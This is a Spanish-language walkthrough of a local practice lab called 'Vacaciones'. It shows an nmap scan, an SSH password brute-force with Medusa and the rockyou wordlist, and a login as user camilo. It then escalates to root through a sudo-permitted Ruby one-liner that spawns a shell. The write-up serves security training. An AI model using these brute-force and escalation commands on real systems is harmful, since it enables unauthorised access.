# Laboratorio 2: Vacaciones

## Descripción
Este laboratorio consiste en obtener acceso a una máquina mediante un ataque de fuerza bruta al servicio SSH y escalar privilegios para obtener acceso root.

## Pasos para la resolución

1. **Despliegue del laboratorio:**
   - Ejecutar el comando: `sudo bash auto_deploy.sh vacaciones.tar`.

     ![image](https://github.com/user-attachments/assets/94699d93-ffd2-40c9-9c97-378cf91775d0)


2. **Reconocimiento:**
   - Verificar la conectividad con la máquina objetivo: `ping -c 1 172.17.0.2`.

  ![image](https://github.com/user-attachments/assets/39f0ddde-bafb-47b4-8a0a-6988c8f73d72)

   - Escanear la máquina con Nmap: `nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oG allPorts`.

  

3. **Ataque de fuerza bruta con Medusa:**
   - Ejecutar el ataque: `medusa -h 172.17.0.2 -U users -P /usr/share/wordlists/rockyou.txt -M ssh`.

     ![image](https://github.com/user-attachments/assets/1a837004-9c40-4dbf-b6d3-48d688685ea7)


    
4. **Acceso SSH:**
   - Conectarse a la máquina: `ssh camilo@172.17.0.2`.
   - Introducir la contraseña obtenida en el paso anterior.
  
    ![image](https://github.com/user-attachments/assets/e15ba6a1-23e9-4368-8a01-5c39a0c9b43a)
 

5. **Escalada de privilegios:**
   - Buscar archivos con permisos SUID: `find / -perm -4000 2>/dev/null`.
   - Encontrar el correo en `/var/mail/camilo/correo.txt`.
   - Cambiar al usuario `juan` con `su juan`.
   - Ejecutar `sudo -l` para listar los comandos permitidos.
   - Elevar privilegios con Ruby: `sudo ruby -e 'exec "/bin/bash"'`.

   ![image](https://github.com/user-attachments/assets/62b7734f-e771-4ddd-8df9-6ac8cfae98f6)

   ![image](https://github.com/user-attachments/assets/8852e99d-8816-4006-9b43-b4d128d8c37e)

   ![image](https://github.com/user-attachments/assets/1a4bb94e-3e91-4e05-b03f-a72777ed6a17)

   ![image](https://github.com/user-attachments/assets/fd2f5945-7893-479c-813b-f86c219f073a)

   ![image](https://github.com/user-attachments/assets/3379c764-07c1-4852-88ba-0280e4f55f22)

 
   ![image](https://github.com/user-attachments/assets/f811e5b9-388b-4c6b-b6d7-0e5fadadc4bd)



## Conclusión
Se logró obtener acceso a la máquina mediante un ataque de fuerza bruta y escalar privilegios para obtener acceso root.
